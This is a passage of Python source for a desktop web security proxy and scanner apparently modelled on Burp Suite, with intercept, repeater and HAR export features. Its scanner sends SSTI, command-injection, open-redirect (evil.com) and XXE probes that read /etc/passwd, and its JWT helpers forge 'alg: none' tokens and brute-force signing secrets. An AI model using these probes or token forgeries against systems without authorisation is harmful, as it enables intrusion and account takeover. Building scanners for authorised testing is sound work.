                             "Restrict CORS to trusted origins", "CWE-346", 7.5)]
        return []

    def _redirect(self):
        for p in ["//evil.com", "https://evil.com"]:
            _, _, h = self._req(f"{self.target}?url={url_quote(p)}&next={url_quote(p)}")
            loc = h.get('Location', '')
            if 'evil' in loc:
                return [self._mk("Open Redirect", "medium",
                                 f"Redirects to {loc}", f"?url={p}", f"Location: {loc}",
                                 "Validate redirect URLs against allowlist", "CWE-601", 6.1)]
        return []

    def _ssti(self):
        for p in ["{{7*7}}", "${7*7}"]:
            _, body, _ = self._req(f"{self.target}?name={url_quote(p)}")
            if '49' in body:
                return [self._mk("SSTI", "critical", f"{p} → 49",
                                 f"GET ?name={p}", body[:300], "Sandbox template engine", "CWE-94", 9.8, "high")]
        return []

    def _cmdi(self):
        for p in ["; sleep 3", "| sleep 3"]:
            t0 = time.time()
            self._req(f"{self.target}?cmd={url_quote(p)}")
            dur = time.time() - t0
            if dur > 2.5:
                return [self._mk("Command Injection", "critical",
                                 f"Delay {dur:.1f}s with: {p}", f"?cmd={p}", f"Time: {dur:.2f}s",
                                 "Never pass user input to shell", "CWE-78", 10.0, "high")]
        return []

    def _tls(self):
        res = []
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            hostname = urlparse(self.target).hostname or self.target
            with socket.create_connection((hostname, 443), timeout=5) as s:
                with ctx.wrap_socket(s) as ss:
                    prot = ss.version()
                    if prot in ('TLSv1', 'TLSv1.1', 'SSLv3'):
                        res.append(self._mk("Weak TLS Version", "medium",
                                            f"Server supports outdated TLS: {prot}",
                                            "TLS handshake", prot, "Disable TLS < 1.2", "CWE-326", 5.9))
        except Exception:
            pass
        return res

    def _xxe(self):
        pl = '<?xml version="1.0"?><!DOCTYPE x[<!ENTITY y SYSTEM "file:///etc/passwd">]><x>&y;</x>'
        st, body, _ = self._req(self.target, 'POST', data=pl, headers={'Content-Type': 'application/xml'})
        if 'root:x:' in body:
            return [self._mk("XXE Injection", "critical",
                             "External entity expanded /etc/passwd", "POST with XXE payload",
                             body[:300], "Disable external entity processing", "CWE-611", 9.8, "high")]
        return []

    def _clickjack(self):
        _, _, h = self._req(self.target)
        hl = {k.lower(): v for k, v in h.items()}
        xfo = hl.get('x-frame-options', '')
        csp = hl.get('content-security-policy', '')
        if not xfo and 'frame-ancestors' not in csp:
            return [self._mk("Clickjacking", "medium",
                             "No X-Frame-Options or CSP frame-ancestors directive",
                             f"GET {self.target}", "", "Set X-Frame-Options: DENY", "CWE-1021", 5.4)]
        return []

# ========== SYNTAX HIGHLIGHTER ==========
class HTTPHighlighter(QSyntaxHighlighter):
    def __init__(self, doc):
        super().__init__(doc)
        self.rules = []
        def add(pat, color, bold=False):
            f = QTextCharFormat()
            f.setForeground(QColor(color))
            if bold:
                f.setFontWeight(700)
            self.rules.append((re.compile(pat), f))
        add(r'\b(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\b', T.GREEN, bold=True)
        add(r'\bHTTP/\d\.\d\b', T.CYAN, bold=True)
        add(r'\b[2]\d{2}\b', T.GREEN)
        add(r'\b[3]\d{2}\b', T.CYAN)
        add(r'\b[4]\d{2}\b', T.YELLOW)
        add(r'\b[5]\d{2}\b', T.RED)
        add(r'^[\w\-]+:', T.BLUE)
        add(r'https?://\S+', T.CYAN)
        add(r'"[^"]*"', T.YELLOW)
        add(r'§[^§]*§', T.PINK)
        # Dims the literal " \r \n" markers inserted by the Repeater's CRLF
        # display toggle — purely cosmetic, never matches real request text
        # since real bodies essentially never contain that exact 5-char
        # sequence of printable backslash/r/backslash/n glyphs.
        add(r' \\r \\n', T.TXT3)

    def highlightBlock(self, text):
        for pat, fmt in self.rules:
            for m in pat.finditer(text):
                self.setFormat(m.start(), m.end() - m.start(), fmt)

# ========== JWT ANALYZER ==========
class JWTAnalyzer:
    @staticmethod
    def decode(token: str) -> dict:
        parts = token.strip().split('.')
        if len(parts) < 2:
            raise ValueError("Not a JWT")
        result = {}
        for i, part in enumerate(parts[:2]):
            pad = 4 - len(part) % 4
            try:
                raw = base64.b64decode(part + '=' * pad)
                result[['header', 'payload'][i]] = json.loads(raw)
            except Exception as e:
                result[['header', 'payload'][i]] = {"error": str(e)}
        return result

    @staticmethod
    def encode_none_attack(token: str) -> str:
        parts = token.strip().split('.')
        if len(parts) < 2:
            return ""
        h = json.loads(base64.b64decode(parts[0] + '=='))
        h['alg'] = 'none'
        new_h = base64.b64encode(json.dumps(h, separators=(',', ':')).encode()).decode().rstrip('=')
        return f"{new_h}.{parts[1]}."

    @staticmethod
    def brute_sign(token: str, wordlist: List[str]) -> Optional[str]:
        if not HAS_JWT:
            return None
        parts = token.strip().split('.')
        if len(parts) < 3:
            return None
        for secret in wordlist:
            try:
                pyjwt.decode(token, secret, algorithms=["HS256"])
                return secret
            except pyjwt.InvalidSignatureError:
                continue
            except Exception:
                continue
        return None

    @staticmethod
    def re_sign(header_json: str, payload_json: str, secret: str, alg='HS256') -> str:
        if not HAS_JWT:
            raise RuntimeError("Install pyjwt")
        payload = json.loads(payload_json)
        token = pyjwt.encode(payload, secret, algorithm=alg,
                             headers=json.loads(header_json))
        return token if isinstance(token, str) else token.decode()

# ========== DIFF ENGINE ==========
class Differ:
    @staticmethod
    def diff(a: str, b: str) -> List[Tuple[str, str]]:
        import difflib
        lines_a = a.splitlines()
        lines_b = b.splitlines()
        sm = difflib.SequenceMatcher(None, lines_a, lines_b, autojunk=False)
        result = []
        for op, i1, i2, j1, j2 in sm.get_opcodes():
            if op == 'equal':
                for l in lines_a[i1:i2]:
                    result.append(('=', l))
            elif op == 'insert':
                for l in lines_b[j1:j2]:
                    result.append(('+', l))
            elif op == 'delete':
                for l in lines_a[i1:i2]:
                    result.append(('-', l))
            elif op == 'replace':
                for l in lines_a[i1:i2]:
                    result.append(('-', l))
                for l in lines_b[j1:j2]:
                    result.append(('+', l))
        return result

# ========== EXTENSION SYSTEM ==========
class ExtensionSystem(QObject):
    """Plugin loader — each .py extension can define hooks:
       on_request(msg: dict) -> dict | None
       on_response(msg: dict) -> dict | None
       EXTENSION_NAME / EXTENSION_DESC / EXTENSION_VERSION / EXTENSION_AUTHOR
    """
    log_signal = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.extensions: Dict[str, dict] = {}

    SAMPLE_EXTENSION = (
        "# Kingception Extension Template\n"
        "EXTENSION_NAME    = 'My Extension'\n"
        "EXTENSION_DESC    = 'Does something useful'\n"
        "EXTENSION_VERSION = '1.0'\n"
        "EXTENSION_AUTHOR  = 'you'\n\n"
        "def on_request(msg: dict):\n"
        "    \"\"\"Called for every captured request. Return modified msg or None.\"\"\"\n"
        "    req_headers = msg.get('req_headers', {})\n"
        "    req_headers['X-Kingception'] = '1'\n"
        "    msg['req_headers'] = req_headers\n"
        "    return msg\n\n"
        "def on_response(msg: dict):\n"
        "    \"\"\"Called for every captured response.\"\"\"\n"
        "    return msg\n"
    )

    def load_file(self, path: str) -> Tuple[bool, str]:
        try:
            stem = re.sub(r"[^a-zA-Z0-9_]", "_", Path(path).stem)
            spec = importlib.util.spec_from_file_location("ixext_" + stem, path)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            name    = getattr(mod, "EXTENSION_NAME",    Path(path).stem)
            desc    = getattr(mod, "EXTENSION_DESC",    "No description")
            version = getattr(mod, "EXTENSION_VERSION", "1.0")
            author  = getattr(mod, "EXTENSION_AUTHOR",  "Unknown")
            self.extensions[name] = {
                "path": path, "module": mod, "desc": desc,
                "version": version, "author": author, "enabled": True,
                "on_request":  getattr(mod, "on_request",  None),
                "on_response": getattr(mod, "on_response", None),
            }
            msg2 = f"Loaded: {name} v{version} by {author}"
            self.log_signal.emit(msg2)
            return True, msg2
        except Exception as e:
            return False, f"Error loading {Path(path).name}: {e}"

    def unload(self, name: str):
        self.extensions.pop(name, None)

    def toggle(self, name: str, enabled: bool):
        if name in self.extensions:
            self.extensions[name]["enabled"] = enabled

    def run_request_hooks(self, msg: dict) -> dict:
        for ext in self.extensions.values():
            if ext["enabled"] and ext.get("on_request"):
                try:
                    result = ext["on_request"](msg)
                    if isinstance(result, dict):
                        msg = result
                except Exception as e:
                    self.log_signal.emit(f"[req hook err] {e}")
        return msg

    def run_response_hooks(self, msg: dict) -> dict:
        for ext in self.extensions.values():
            if ext["enabled"] and ext.get("on_response"):
                try:
                    result = ext["on_response"](msg)
                    if isinstance(result, dict):
                        msg = result
                except Exception as e:
                    self.log_signal.emit(f"[resp hook err] {e}")
        return msg


# ========== WEBSOCKET TRACKER ==========
class WSTracker(QObject):
    """Tracks WebSocket upgrade handshakes from proxy traffic."""
    upgrade_seen = pyqtSignal(dict)

    def __init__(self):
        super().__init__()
        self.sessions: List[dict] = []

    def check_message(self, msg: dict):
        rh = msg.get("req_headers", {})
        if isinstance(rh, str):
            try:
                rh = json.loads(rh)
            except Exception:
                rh = {}
        upgrade = rh.get("Upgrade", rh.get("upgrade", "")).lower()
        if upgrade == "websocket":
            session = {
                "id":     msg["id"],
                "url":    msg["url"].replace("http://", "ws://").replace("https://", "wss://"),
                "host":   msg.get("host", ""),
                "ts":     msg.get("ts", time.time()),
                "status": msg.get("status", 101),
            }
            self.sessions.append(session)
            self.upgrade_seen.emit(session)


# ========== SPARKLINE ==========
class SparklineWidget(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self._data = []
        self.setMinimumHeight(48)

    def push(self, v: float):
        self._data.append(v)
        if len(self._data) > 120:
            self._data = self._data[-120:]
        self.update()

    def paintEvent(self, e):
        if len(self._data) < 2:
            return
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        w, h = self.width(), self.height()
        p.fillRect(0, 0, w, h, QColor(T.BG))
        mx = max(self._data) or 1
        pts = [QPointF(i / (len(self._data) - 1) * w, (1 - v / mx) * (h - 4) + 2)
               for i, v in enumerate(self._data)]
        path = QPainterPath()
        path.moveTo(pts[0])
        for pt in pts[1:]:
            path.lineTo(pt)
        pen = QPen(QColor(T.BLUE), 1.5)
        p.setPen(pen)
        p.drawPath(path)
        fill = QPainterPath(path)
        fill.lineTo(pts[-1].x(), h)
        fill.lineTo(pts[0].x(), h)
        fill.closeSubpath()
        grad = QLinearGradient(0, 0, 0, h)
        grad.setColorAt(0, QColor(T.BLUE + "44"))
        grad.setColorAt(1, QColor(T.BLUE + "00"))
        p.fillPath(fill, grad)

# ========== MAIN WINDOW ==========
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.proxy = ProxyServer()
        self.db = self.proxy.db
        self.intercept = self.proxy.intercept
        self._cur_req_pi = None
        self._intruder = None
        self._scanner = None
        self._discovery = None
        self._param_miner = None
        self._oob = None
        self._intr_resp = {}
        self._autoscroll = True
        self._host_filter = None
        self._thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=10)
        self.ext_sys = ExtensionSystem()
        self.scope = ScopeManager()
        self.sessions = SessionManager()
        self.ws_tracker = WSTracker()
        self._msg_notes: Dict[str, str] = {}
        self._msg_colors: Dict[str, str] = {}
        self.setWindowTitle("⚡ Kingception v1.0  —  Professional HTTP Security Suite  [Dark]")
        self.resize(1700, 1000)
        self.setStyleSheet(CSS)
        self.settings = QSettings("Kingception", "v6")
        self._build_ui()
        self._connect_signals()
        self._stats_timer = QTimer(self)
        self._stats_timer.timeout.connect(self._update_stats)
        self._stats_timer.start(1000)
        self._load_settings()
        self._refresh_rules()   # safe — rules_tbl created in _build_ui via _settings_tab eager path
        self._log("⚡ Kingception v1.0 ready — proxy auto‑started on 127.0.0.1:8080")
        self._log(f"CA cert: {'✅ present' if self.proxy.certs.has_ca() else '⚠ not found — generate in Settings'}")
        self._log("Configure browser: FoxyProxy → HTTP 127.0.0.1:8080")
        self._log("v6.0: dark theme, body intercept fix, chunked encoding, hex view, URL filter, theme toggle")
        # Auto‑start proxy
        self.proxy.start('127.0.0.1', 8080)

    def _build_ui(self):
        self._build_toolbar()
        outer = QSplitter(Qt.Orientation.Horizontal)
        self.setCentralWidget(outer)
        outer.addWidget(self._host_sidebar())
        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        outer.addWidget(self.tabs)
        outer.setSizes([200, 1500])

        # ── Core tabs (eager) — Proxy replaced by Traffic ──────────────────
        self.tabs.addTab(self._traffic_tab(),   "Traffic")      # 0 – replaces old Proxy
        self.tabs.addTab(self._intercept_tab(), "Intercept")    # 1
        self.tabs.addTab(self._repeater_tab(),  "Repeater")     # 2
        self.tabs.addTab(self._intruder_tab(),  "Intruder")     # 3
        self.tabs.addTab(self._scanner_tab(),   "Scanner")      # 4
        self.tabs.addTab(self._decoder_tab(),   "Decoder")      # 5
        self.tabs.addTab(self._settings_tab(),  "Settings")     # 6

        # ── Lazy tabs ──────────────────────────────────────────────────────
        self._lazy_tabs = {
            7:  ("Analysis",    self._analysis_tab),  # NEW — replaces Proxy with power features
            8:  ("Logger",      self._logger_tab),
            9:  ("AI Analyzer", self._ai_analyzer_tab),
        }
        _ph_set = set(self._lazy_tabs.keys())
        for _li, (_ll, _) in self._lazy_tabs.items():
            self.tabs.addTab(QWidget(), _ll)

        def _lazy_load(idx):
            if idx in _ph_set and idx in self._lazy_tabs:
                _ph_set.discard(idx)
                _ll2, _fn2 = self._lazy_tabs.pop(idx)
                real = _fn2()
                self.tabs.removeTab(idx)
                self.tabs.insertTab(idx, real, _ll2)
                self.tabs.setCurrentIndex(idx)

        self.tabs.currentChanged.connect(_lazy_load)
        self._build_statusbar()

    def _build_toolbar(self):
        tb = QToolBar("Main", self)
        tb.setMovable(False)
        tb.setFixedHeight(44)
        tb.setStyleSheet(f"QToolBar{{background:{T.PANEL};border-bottom:1px solid {T.BORDER};"
                         f"padding:4px 12px;spacing:6px;}}")
        self.addToolBar(tb)

        self.search_box = QLineEdit()
        self.search_box.setPlaceholderText("Search history…")
        self.search_box.setFixedWidth(220)
        self.search_box.setFixedHeight(30)

        self.f_method = QComboBox()
        self.f_method.addItems(["All", "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD"])
        self.f_method.setFixedWidth(82)

        self.f_status = QComboBox()
        self.f_status.addItems(["All", "2xx", "3xx", "4xx", "5xx"])
        self.f_status.setFixedWidth(64)

        self.clear_btn  = self._btn("Clear", h=30)
        self.export_btn = self._btn("Export", h=30)
        self.theme_btn  = QPushButton("Light")
        self.theme_btn.setFixedHeight(30); self.theme_btn.setFixedWidth(52)
        self.theme_btn.setToolTip("Toggle dark/light theme")
        self.theme_btn.clicked.connect(self._toggle_theme)

        for w in [self.search_box, self.f_method, self.f_status, None,
                  self.clear_btn, self.export_btn, None, self.theme_btn]:
            if w is None: tb.addSeparator()
            else: tb.addWidget(w)

    def _build_statusbar(self):
        sb = QStatusBar(self)
        self.setStatusBar(sb)
        self.s_status = QLabel("● Proxy running on 127.0.0.1:8080")
        self.s_reqs = QLabel("0 reqs")
        self.s_rps = QLabel("0 r/s")
        self.s_bytes = QLabel("↑0 B ↓0 B")
        self.s_hosts = QLabel("0 hosts")
        self.s_pending = QLabel("")
        for lbl in [self.s_status, self.s_reqs, self.s_rps, self.s_bytes, self.s_hosts, self.s_pending]:
            sb.addPermanentWidget(lbl)
            lbl.setStyleSheet(f"color: {T.TXT2}; padding: 0 10px; font-size: 11px")

    def _host_sidebar(self):
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(4, 4, 4, 4)
        lbl = QLabel("HOSTS")
        lbl.setStyleSheet(f"color: {T.TXT3}; font-size: 10px; font-weight: 700; letter-spacing: 1.5px; padding: 4px")
        v.addWidget(lbl)
        self.host_list = QListWidget()
        self.host_list.setStyleSheet("QListWidget { font-size: 12px; }")
        v.addWidget(self.host_list)
        ref_btn = self._btn("↻ Refresh", h=26)
        ref_btn.clicked.connect(self._refresh_host_list)
        v.addWidget(ref_btn)
        self.host_list.itemClicked.connect(lambda item: (
            setattr(self, '_host_filter', item.data(Qt.ItemDataRole.UserRole)),
            self._filter_proxy_tree()
        ))
        return w

    def _refresh_host_list(self):
        self.host_list.clear()
        item0 = QListWidgetItem("All hosts")
        item0.setForeground(QBrush(QColor(T.BLUE)))
        item0.setData(Qt.ItemDataRole.UserRole, None)
        self.host_list.addItem(item0)
        for host, cnt in self.db.hosts():
            item = QListWidgetItem(f"{host}  ({cnt})")
            item.setData(Qt.ItemDataRole.UserRole, host)
            self.host_list.addItem(item)

    # ---------- Proxy Tab ----------
    def _traffic_tab(self):
        """Live HTTP history — modern replacement for the old Proxy tab."""
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(0, 0, 0, 0)
        v.setSpacing(0)

        # ── Top filter bar ───────────────────────────────────────────────────
        bar = QWidget(); bar.setFixedHeight(38)
        bar.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        bl = QHBoxLayout(bar); bl.setContentsMargins(10,0,10,0); bl.setSpacing(6)

        self.autoscroll_chk = QCheckBox("Auto-scroll")
        self.autoscroll_chk.setChecked(True)
        self.autoscroll_chk.setStyleSheet(f"color:{T.TXT2};font-size:11px;")
        self.autoscroll_chk.toggled.connect(lambda on: setattr(self,'_autoscroll',on))

        _tf_search = QLineEdit(); _tf_search.setFixedHeight(26)
        _tf_search.setPlaceholderText("Search host, path, status…")
        _tf_search.setFixedWidth(220)

        _mf = QComboBox(); _mf.setFixedHeight(26); _mf.setFixedWidth(76)
        _mf.addItems(["All","GET","POST","PUT","DELETE","PATCH","HEAD"])
        _sf = QComboBox(); _sf.setFixedHeight(26); _sf.setFixedWidth(60)
        _sf.addItems(["All","2xx","3xx","4xx","5xx"])

        _clr = QPushButton("Clear"); _clr.setFixedHeight(26)
        _clr.clicked.connect(lambda: self.proxy_tree.clear())
        _exp = QPushButton("Export HAR"); _exp.setFixedHeight(26)
        _exp.clicked.connect(self._export_har)

        _cnt = QLabel("0 requests")
        _cnt.setStyleSheet(f"color:{T.TXT3};font-size:11px;font-family:{T.MONO};")
        self._traffic_count_lbl = _cnt

        bl.addWidget(self.autoscroll_chk)
        bl.addSpacing(8)
        bl.addWidget(QLabel("Search:")); bl.addWidget(_tf_search)
        bl.addWidget(QLabel("Method:")); bl.addWidget(_mf)
        bl.addWidget(QLabel("Status:")); bl.addWidget(_sf)
        bl.addSpacing(8)
        bl.addWidget(_clr); bl.addWidget(_exp)
        bl.addStretch(); bl.addWidget(_cnt)
        v.addWidget(bar)

        # ── Main vertical splitter ───────────────────────────────────────────
        sp = QSplitter(Qt.Orientation.Vertical)
        sp.setHandleWidth(2)

        # History tree
        self.proxy_tree = QTreeWidget()
        self.proxy_tree.setHeaderLabels(["#","Method","Host","Path","Status","Size","Time","Content-Type"])
        self.proxy_tree.setAlternatingRowColors(True)
        self.proxy_tree.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.proxy_tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.proxy_tree.setRootIsDecorated(False)
        self.proxy_tree.setUniformRowHeights(True)
        self.proxy_tree.setSortingEnabled(True)
        self.proxy_tree.setStyleSheet(
            f"QTreeWidget{{background:{T.PANEL};border:none;border-radius:0;"
            f"alternate-background-color:{T.SURFACE};}}"
            f"QTreeWidget::item{{padding:4px 8px;border-bottom:1px solid {T.BORDER}18;}}"
            f"QTreeWidget::item:selected{{background:{T.BLUE}22;color:{T.TXT1};}}")
        for i,w2 in enumerate([40,68,170,380,60,70,60,120]):
            self.proxy_tree.setColumnWidth(i, w2)
        sp.addWidget(self.proxy_tree)

        # Request / Response viewer
        bottom = QSplitter(Qt.Orientation.Horizontal)
        bottom.setHandleWidth(2)
        for title, attr in [("Request","req_view"),("Response","resp_view")]:
            c = QWidget(); cv = QVBoxLayout(c); cv.setContentsMargins(0,0,0,0)
            hdr = QWidget(); hdr.setFixedHeight(24)
            hdr.setStyleSheet(f"background:{T.PANEL};border-top:1px solid {T.BORDER};"
                              f"border-bottom:1px solid {T.BORDER};")
            hl = QHBoxLayout(hdr); hl.setContentsMargins(10,0,8,0)
            lbl2 = QLabel(title.upper())
            lbl2.setStyleSheet(f"color:{T.TXT3};font-size:9px;font-weight:700;letter-spacing:2px;")
            hl.addWidget(lbl2); hl.addStretch()
            pe = QPlainTextEdit(); pe.setReadOnly(True); pe.setFont(mono_font(10))
            pe.setLineWrapMode(QPlainTextEdit.LineWrapMode.NoWrap)
            pe.setStyleSheet(f"background:{T.BG};color:{T.CODE};border:none;padding:8px;font-family:{T.MONO};")
            HTTPHighlighter(pe.document())
            setattr(self, attr, pe)
            cv.addWidget(hdr); cv.addWidget(pe)
            bottom.addWidget(c)

        sp.addWidget(bottom)
        sp.setSizes([520, 300])
        v.addWidget(sp, 1)

        # ── Wire tree selection and context menu ─────────────────────────────
        self.proxy_tree.currentItemChanged.connect(
            lambda cur, prev: self._on_tree_click(cur, 0) if cur else None)
        self.proxy_tree.customContextMenuRequested.connect(self._proxy_ctx)

        # ── Filter connections ───────────────────────────────────────────────
        def _apply_filter():
            term  = _tf_search.text().lower()
            mf    = _mf.currentText()
            sf    = _sf.currentText()
            count = 0
            for i2 in range(self.proxy_tree.topLevelItemCount()):
                it = self.proxy_tree.topLevelItem(i2)
                m2  = it.text(1)
                st  = it.text(4)
                txt = (it.text(2) + it.text(3)).lower()
                show = True
                if term and term not in txt: show = False
                if mf != "All" and m2 != mf: show = False
                if sf != "All" and not st.startswith(sf[0]): show = False
                it.setHidden(not show)
                if show: count += 1
            _cnt.setText(f"{count} requests")

        _tf_search.textChanged.connect(_apply_filter)
        _mf.currentTextChanged.connect(_apply_filter)
        _sf.currentTextChanged.connect(_apply_filter)

        return w

    def _export_har(self):
        """Export captured traffic as HAR (HTTP Archive) JSON."""
        import json as _json
        from datetime import datetime
        msgs = list(self.db.recent)
        if not msgs:
            QMessageBox.information(self,"Export HAR","No traffic captured yet.")
            return
        har = {
            "log": {
                "version": "1.2",
                "creator": {"name": "Kingception", "version": "6.0"},
                "entries": []
            }
        }
        for m in msgs:
            rh = m.get('req_headers', {}) or {}
            entry = {
                "startedDateTime": datetime.utcfromtimestamp(m.get('ts', 0)).isoformat() + "Z",
                "time": round((m.get('dur', 0)) * 1000, 2),
                "request": {
                    "method": m.get('method', 'GET'),
                    "url": m.get('url', ''),
                    "httpVersion": "HTTP/1.1",
                    "headers": [{"name": k, "value": v} for k, v in rh.items()],
                    "queryString": [],
                    "bodySize": len(m.get('req_body') or b''),
                    "postData": {"mimeType": rh.get('Content-Type', ''),
                                 "text": decode_body(m.get('req_body'))} if m.get('req_body') else None
                },
                "response": {
                    "status": m.get('status', 0),
                    "statusText": "",
                    "httpVersion": "HTTP/1.1",
                    "headers": [{"name": k, "value": v} for k, v in (m.get('resp_headers') or {}).items()],
                    "content": {
                        "size": m.get('resp_size', 0),
                        "mimeType": m.get('content_type', ''),
                        "text": decode_body(m.get('resp_body'))
                    },
                    "bodySize": m.get('resp_size', 0),
                    "redirectURL": ""
                },
                "cache": {},
                "timings": {"send": 0, "wait": round((m.get('dur', 0)) * 1000, 2), "receive": 0}
            }
            har["log"]["entries"].append(entry)
        path, _ = QFileDialog.getSaveFileName(self, "Export HAR", "kingception_traffic.har",
                                               "HAR files (*.har);;JSON (*.json)")
        if path:
            with open(path, 'w', encoding='utf-8') as f:
                _json.dump(har, f, indent=2, ensure_ascii=False)
            self._log(f"Exported {len(msgs)} requests to {path}")

    def _intercept_tab(self):
        """Two-pane intercept: top = URL queue, bottom = selected request editor."""
        w = QWidget()
        root = QVBoxLayout(w)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # ── TOP TOOLBAR ─────────────────────────────────────────────────────
        top = QWidget(); top.setFixedHeight(44)
        top.setStyleSheet(f"background:{T.PANEL};border-bottom:1px solid {T.BORDER};")
        tl = QHBoxLayout(top); tl.setContentsMargins(10,0,10,0); tl.setSpacing(6)

        self.ic_btn = QPushButton("Intercept OFF")
        self.ic_btn.setCheckable(True)
        self.ic_btn.setFixedHeight(30); self.ic_btn.setFixedWidth(130)
        self.ic_btn.setStyleSheet(
            f"QPushButton{{background:{T.SURFACE};color:{T.TXT2};"
            f"border:1px solid {T.BORDER};border-radius:6px;"
            f"font-size:12px;font-weight:700;}}"
            f"QPushButton:checked{{background:{T.GREEN}18;color:{T.GREEN};"
            f"border:1px solid {T.GREEN}66;}}")

        self.ic_fwd      = QPushButton("Forward");     self.ic_fwd.setObjectName("success")
        self.ic_drop     = QPushButton("Drop");        self.ic_drop.setObjectName("danger")
        self.ic_fwd_all  = QPushButton("Forward All"); self.ic_fwd_all.setObjectName("success")
        self.ic_drop_all = QPushButton("Drop All");    self.ic_drop_all.setObjectName("danger")
        for _b in [self.ic_fwd,self.ic_drop,self.ic_fwd_all,self.ic_drop_all]:
            _b.setFixedHeight(30); _b.setEnabled(False)

        self.ic_action_btn = QPushButton("Action ▾")
        self.ic_action_btn.setFixedHeight(30); self.ic_action_btn.setEnabled(False)

        self.ic_resp_chk = QCheckBox("Intercept responses")
        self.ic_resp_chk.setStyleSheet(f"color:{T.TXT2};font-size:11px;")

        self.ic_req_filter = QLineEdit()
        self.ic_req_filter.setPlaceholderText("URL filter (regex)…")
        self.ic_req_filter.setFixedWidth(220); self.ic_req_filter.setFixedHeight(28)

        tl.addWidget(self.ic_btn)
        tl.addSpacing(4)
        for _b2 in [self.ic_fwd, self.ic_drop, self.ic_fwd_all, self.ic_drop_all, self.ic_action_btn]:
            tl.addWidget(_b2)
        tl.addStretch()
        tl.addWidget(self.ic_resp_chk)
        tl.addSpacing(12)
        tl.addWidget(QLabel("Filter:")); tl.addWidget(self.ic_req_filter)
        root.addWidget(top)

        # ── STATUS BANNER ────────────────────────────────────────────────────
        self.ic_banner = QLabel("  Intercept is OFF")
        self.ic_banner.setFixedHeight(24)
        self.ic_banner.setStyleSheet(
            f"background:{T.SURFACE};color:{T.TXT3};"
            f"font-size:11px;padding:0 12px;border-bottom:1px solid {T.BORDER};")
        root.addWidget(self.ic_banner)

        # ── MAIN SPLITTER: URL queue (top) | request editor (bottom) ─────────
        splitter = QSplitter(Qt.Orientation.Vertical)
        splitter.setHandleWidth(3)
        splitter.setStyleSheet(
            f"QSplitter::handle{{background:{T.BORDER};}}"
            f"QSplitter::handle:hover{{background:{T.BLUE};}}")

        # ── UPPER PANE: intercepted URL queue ─────────────────────────────────
        self.ic_queue_tbl = QTableWidget(0, 5)
        self.ic_queue_tbl.setHorizontalHeaderLabels(
            ["  Method", "Host", "Path", "Body", "Content-Type"])
        hdr = self.ic_queue_tbl.horizontalHeader()
        hdr.setStretchLastSection(True)
        hdr.resizeSection(0, 80); hdr.resizeSection(1, 180)
        hdr.resizeSection(2, 260); hdr.resizeSection(3, 60)
        self.ic_queue_tbl.setSelectionBehavior(
            QTableWidget.SelectionBehavior.SelectRows)
        self.ic_queue_tbl.setSelectionMode(
            QTableWidget.SelectionMode.SingleSelection)
        self.ic_queue_tbl.setAlternatingRowColors(True)
        self.ic_queue_tbl.setEditTriggers(
            QTableWidget.EditTrigger.NoEditTriggers)
        self.ic_queue_tbl.verticalHeader().setVisible(False)
        self.ic_queue_tbl.setShowGrid(False)
        self.ic_queue_tbl.setStyleSheet(
            f"QTableWidget{{background:{T.PANEL};border:none;border-radius:0;"
            f"gridline-color:{T.BORDER};selection-background-color:{T.BLUE}22;}}"
            f"QTableWidget::item{{padding:5px 10px;border-bottom:1px solid {T.BORDER}22;}}")
        self.ic_queue_tbl.itemSelectionChanged.connect(self._ic_queue_row_changed)
        splitter.addWidget(self.ic_queue_tbl)

        # ── LOWER PANE: request editor panel ─────────────────────────────────
        ed_panel = QWidget()
        ed_vl = QVBoxLayout(ed_panel); ed_vl.setContentsMargins(0,0,0,0); ed_vl.setSpacing(0)

        # Editor toolbar
        ed_tb = QWidget(); ed_tb.setFixedHeight(28)
        ed_tb.setStyleSheet(f"background:{T.PANEL};border-top:1px solid {T.BORDER};"
                            f"border-bottom:1px solid {T.BORDER};")
        etbl = QHBoxLayout(ed_tb); etbl.setContentsMargins(8,0,8,0); etbl.setSpacing(4)

        _rl = QLabel("REQUEST")
        _rl.setStyleSheet(f"color:{T.TXT3};font-size:10px;font-weight:700;letter-spacing:2px;")
        etbl.addWidget(_rl); etbl.addStretch()

        def _etb(lbl, tip):
            b = QPushButton(lbl); b.setFixedHeight(20); b.setToolTip(tip)
            b.setStyleSheet(f"background:{T.SURFACE};color:{T.TXT2};"
                            f"border:1px solid {T.BORDER};border-radius:4px;"
                            f"font-size:10px;padding:0 8px;"); return b

        self.ic_chg_method_btn = _etb("Method",    "Change HTTP method")
        self.ic_add_hdr_btn    = _etb("+ Header",  "Add a header")
        self.ic_del_hdr_btn    = _etb("− Header",  "Remove a header")
        self.ic_nl_btn         = _etb("New Line",  "Insert \r\n at cursor")
        self.ic_beautify_btn   = _etb("Beautify",  "Pretty-print JSON/XML body")
        self.ic_cl_live        = QLabel("0 B")
        self.ic_cl_live.setStyleSheet(f"color:{T.CYAN};font-size:10px;font-family:{T.MONO};")
        self.ic_queue_lbl      = QLabel("0 queued")
        self.ic_queue_lbl.setStyleSheet(f"color:{T.TXT3};font-size:10px;font-family:{T.MONO};")

        for _bx in [self.ic_chg_method_btn, self.ic_add_hdr_btn,
                    self.ic_del_hdr_btn, self.ic_nl_btn, self.ic_beautify_btn]:
            etbl.addWidget(_bx)
        etbl.addSpacing(12)
        etbl.addWidget(self.ic_cl_live)
        etbl.addSpacing(12)
        etbl.addWidget(self.ic_queue_lbl)
        ed_vl.addWidget(ed_tb)

        # Sub-tabs: Raw | Headers | Body | Pretty | Hex
        self.ic_view_tabs = QTabWidget()
        self.ic_view_tabs.setStyleSheet(
